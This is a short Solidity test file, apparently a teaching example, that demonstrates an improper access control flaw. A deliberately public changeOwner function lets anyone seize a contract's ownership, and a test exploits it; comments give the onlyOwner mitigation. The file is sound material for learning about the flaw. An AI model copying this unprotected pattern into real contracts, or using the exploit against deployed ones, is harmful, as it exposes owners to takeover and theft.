// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import "forge-std/Test.sol";

/*
Name: Improper Access Control Vulnerability

Description:
The default visibility of the function is Public. 
If there is an unsafe visibility setting, the attacker can directly call the sensitive function in the smart contract.

The ownerGame contract has a changeOwner function that is intended to change the owner of the contract.
However, due to improper access control, this function is publicly accessible and 
can be called by any external account or contract. As a result, an attacker can call this function
to change the ownership of the contract and take control.

Impact: the owner of the contract can be changed by anyone.

Mitigation:
Use access control modifiers: Solidity provides modifiers, such as onlyOwner, 
which can be used to restrict the access of functions
 
*/

contract ContractTest is Test {
    ownerGame ownerGameContract;

    function testVisibility() public {
        ownerGameContract = new ownerGame();
        console.log(
            "Before exploiting, owner of ownerGame:",
            ownerGameContract.owner()
        );
        ownerGameContract.changeOwner(msg.sender);
        console.log(
            "After exploiting, owner of ownerGame:",
            ownerGameContract.owner()
        );
        console.log("Exploit completed");
    }

    receive() external payable {}
}

contract ownerGame {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // wrong visibility of changeOwner function should be onlyOwner
    function changeOwner(address _new) public {
        owner = _new;
    }
}
